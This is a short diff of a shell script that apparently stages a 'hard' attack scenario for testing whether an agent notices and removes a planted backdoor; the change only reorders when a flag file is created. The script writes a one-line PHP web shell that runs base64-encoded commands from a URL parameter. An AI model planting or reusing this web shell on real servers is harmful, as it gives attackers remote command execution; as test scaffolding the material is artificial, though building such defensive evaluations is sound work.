@@ -22,7 +22,6 @@ FLAG_FILE="/tmp/.hard_attack_active"
 # So flag file is deleted and script exits cleanly
 if [ -f "$FLAG_FILE" ] && [ ! -f "$BACKDOOR" ]; then
     echo "Backdoor was removed by agent. Attack neutralized."
-    rm -f "$FLAG_FILE"
     exit 0
 fi
 
@@ -30,10 +29,10 @@ echo "Planting backdoor at $BACKDOOR with attacker IP $ATTACKER_IP"
 
 # Plants the backdoor and creates the flag file
 if [ ! -f "$BACKDOOR" ]; then
+    touch "$FLAG_FILE"
     cat > "$BACKDOOR" << 'EOF'
 <?php if(isset($_GET['cmd'])){ @system(base64_decode($_GET['cmd'])); } ?>
 EOF
-    touch "$FLAG_FILE"
 fi
 
 echo "Starting hard scenario attack..."
